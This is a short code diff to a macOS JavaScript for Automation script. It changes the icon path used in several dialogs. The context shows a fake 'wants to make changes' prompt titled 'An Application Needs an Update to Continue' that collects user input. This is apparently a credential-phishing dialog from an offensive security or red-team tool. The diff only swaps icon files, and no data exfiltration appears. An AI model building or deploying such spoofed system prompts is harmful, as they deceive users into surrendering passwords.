@@ -47,7 +47,7 @@ var splitFileOutput = fixedFileOutput.split("\n")
  }
 
 var defaultIconName = "AppIcon"
-var defaultIconStr = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
+var defaultIconStr = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns"
 var resourcesFolder = "/Contents/Resources"
 var iconExt = ".icns"
 var makeChanges = " wants to make changes."
@@ -76,7 +76,7 @@ var iconNameString = iconName.toString()
 } 
 if (iconNameString.includes('icns') == true ){
 	var icon = iconFolder + iconName[0]
-} else {var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
+} else {var icon = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns"
 }
 
 var prompt = newApp.displayDialog(text, {
@@ -109,7 +109,7 @@ if (promptResults == ""){
 
 } else {
 var config = [];
-var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
+var icon = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns";
     var title = "An Application Needs an Update to Continue";
     var text = "An Application Needs an Update to Continue";
 
